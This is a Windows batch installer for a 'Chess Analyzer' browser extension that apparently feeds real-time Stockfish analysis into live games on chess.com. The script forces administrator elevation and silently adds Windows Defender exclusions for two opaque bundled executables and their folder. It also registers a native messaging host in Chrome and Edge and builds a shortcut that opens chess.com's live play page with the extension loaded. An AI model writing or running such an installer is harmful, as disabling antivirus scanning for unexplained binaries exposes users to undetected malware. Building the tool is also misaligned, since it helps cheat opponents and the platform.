@echo off
setlocal EnableDelayedExpansion
cd /d "%~dp0"

:: ============================================================================
:: CHESS ANALYZER - ONE-CLICK INSTALLER
:: ============================================================================

color 0A
title Chess Analyzer - Setup

:: Initialize
set "INSTALL_PATH=%~dp0"
set "INSTALL_PATH=%INSTALL_PATH:~0,-1%"
set "ERRORS=0"

:: ============================================================================
:: HEADER
:: ============================================================================
cls
echo.
echo   ========================================================================
echo                                                                    
echo                  CHESS ANALYZER - INSTALLER                        
echo                                                                    
echo            Real-time chess analysis powered by Stockfish            
echo                                                                    
echo   ========================================================================
echo.

:: ============================================================================
:: ADMIN CHECK
:: ============================================================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo   [INFO] Requesting Administrator privileges...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs" >nul 2>&1
    exit /b
)

echo   [OK] Running with Administrator privileges
echo.
echo   ------------------------------------------------------------------------
echo.

:: ============================================================================
:: STEP 1: VERIFY FILES
:: ============================================================================
echo   [1/4] Checking required files...
echo.

if not exist "%INSTALL_PATH%\backend\server.exe" (
    echo         [ERROR] Missing: backend\server.exe
    echo         [FIX] Please re-download the Chess Analyzer package
    set /a ERRORS+=1
) else (
    echo         [OK] Server executable found
)

if not exist "%INSTALL_PATH%\native-host\host.exe" (
    echo         [ERROR] Missing: native-host\host.exe
    echo         [FIX] Please re-download the Chess Analyzer package
    set /a ERRORS+=1
) else (
    echo         [OK] Native host found
)

if not exist "%INSTALL_PATH%\extension\manifest.json" (
    echo         [ERROR] Missing: extension folder
    echo         [FIX] Please re-download the Chess Analyzer package
    set /a ERRORS+=1
) else (
    echo         [OK] Extension files found
)

if %ERRORS% gtr 0 (
    echo.
    echo   ========================================================================
    echo     INSTALLATION FAILED - Missing required files                   
    echo   ========================================================================
    pause
    exit /b 1
)

echo.

:: ============================================================================
:: STEP 2: SECURITY SETUP
:: ============================================================================
echo   [2/4] Configuring Windows Security...
echo.

:: Unblock downloaded files
echo         Unblocking executables...
powershell -Command "Get-ChildItem '%INSTALL_PATH%' -Recurse -Include *.exe | Unblock-File -ErrorAction SilentlyContinue" >nul 2>&1
echo         [OK] Files unblocked

:: Add Windows Defender exclusions
echo         Adding antivirus exceptions...
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_PATH%\backend\server.exe' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_PATH%\native-host\host.exe' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_PATH%\backend' -ErrorAction SilentlyContinue" >nul 2>&1
echo         [OK] Antivirus exceptions added

:: Install VC++ Runtime if bundled and needed
if exist "%INSTALL_PATH%\vc_redist.x64.exe" (
    if not exist "%SystemRoot%\System32\vcruntime140.dll" (
        echo         Installing Visual C++ Runtime...
        start /wait "" "%INSTALL_PATH%\vc_redist.x64.exe" /install /quiet /norestart
        echo         [OK] Runtime installed
    ) else (
        echo         [OK] Visual C++ Runtime already present
    )
)

echo.

:: ============================================================================
:: STEP 3: REGISTER COMPONENTS
:: ============================================================================
echo   [3/4] Registering with Chrome...
echo.

:: Update native host JSON with absolute path
set "HOST_EXE_PATH=%INSTALL_PATH%\native-host\host.exe"
set "JSON_PATH=%INSTALL_PATH%\native-host\com.chess.analyzer.json"

:: Create properly formatted JSON with absolute path
echo         Configuring native messaging host...
(
echo {
echo     "name": "com.chess.analyzer",
echo     "description": "Chess Analyzer Native Host",
echo     "path": "%HOST_EXE_PATH:\=\\%",
echo     "type": "stdio",
echo     "allowed_origins": [
echo         "chrome-extension://mgccpneeplghkffefnmoihnhhpdfjnke/"
echo     ]
echo }
) > "%JSON_PATH%"
echo         [OK] Native host configured

:: Register in Chrome
reg add "HKCU\Software\Google\Chrome\NativeMessagingHosts\com.chess.analyzer" /ve /t REG_SZ /d "%JSON_PATH%" /f >nul 2>&1
echo         [OK] Registered with Chrome

:: Register in Edge (bonus)
reg add "HKCU\Software\Microsoft\Edge\NativeMessagingHosts\com.chess.analyzer" /ve /t REG_SZ /d "%JSON_PATH%" /f >nul 2>&1
echo         [OK] Registered with Edge

echo.

:: ============================================================================
:: STEP 4: CREATE SHORTCUTS & TEST
:: ============================================================================
echo   [4/4] Creating shortcuts and testing...
echo.

:: Find Chrome path
set "CHROME_PATH="
for /f "tokens=2*" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" /ve 2^>nul') do set "CHROME_PATH=%%B"
if not defined CHROME_PATH (
    for /f "tokens=2*" %%A in ('reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" /ve 2^>nul') do set "CHROME_PATH=%%B"
)

:: Create desktop shortcut
if defined CHROME_PATH (
    echo         Creating desktop shortcut...
    set "EXT_PATH=%INSTALL_PATH%\extension"
    powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut([Environment]::GetFolderPath('Desktop') + '\Play Chess Analyzer.lnk'); $Shortcut.TargetPath = '%CHROME_PATH%'; $Shortcut.Arguments = '--load-extension=\"%INSTALL_PATH%\extension\" https://www.chess.com/play/online'; $Shortcut.Description = 'Play Chess with Analyzer'; $Shortcut.Save()" >nul 2>&1
    echo         [OK] Desktop shortcut created
) else (
    echo         [WARN] Chrome not found - shortcut not created
)

:: Quick server test
echo         Testing server startup...
taskkill /F /IM server.exe >nul 2>&1
start /B "" "%INSTALL_PATH%\backend\server.exe" >nul 2>&1
timeout /t 3 /nobreak >nul

:: Check if server started
netstat -ano 2>nul | findstr ":5000" | findstr "LISTENING" >nul
if %errorlevel% equ 0 (
    echo         [OK] Server test passed
    taskkill /F /IM server.exe >nul 2>&1
) else (
    echo         [WARN] Server test inconclusive - may need manual start
)

echo.

:: ============================================================================
:: SUCCESS
:: ============================================================================
echo   ========================================================================
echo                                                                    
echo                  INSTALLATION COMPLETE!                          
echo                                                                    
echo   ========================================================================
echo.
echo   ------------------------------------------------------------------------
echo.
echo   NEXT STEPS:
echo.
echo   1. Open Chrome and go to: chrome://extensions
echo.
echo   2. Enable "Developer mode" (toggle in top-right corner)
echo.
echo   3. Click "Load unpacked" and select this folder:
echo      %INSTALL_PATH%\extension
echo.
echo   4. Done! Use the "Play Chess Analyzer" shortcut on your desktop.
echo.
echo   ------------------------------------------------------------------------
echo.
echo   TIP: The server starts automatically when you use the shortcut!
echo.
echo   ------------------------------------------------------------------------
echo.

:: Ask to open Chrome extensions page
set /p OPEN_CHROME="   Open Chrome extensions page now? (Y/N): "
if /i "%OPEN_CHROME%"=="Y" (
    if defined CHROME_PATH (
        start "" "%CHROME_PATH%" "chrome://extensions"
    ) else (
        start "" "chrome://extensions"
    )
)

echo.
echo   Press any key to exit...
pause >nul
exit /b 0
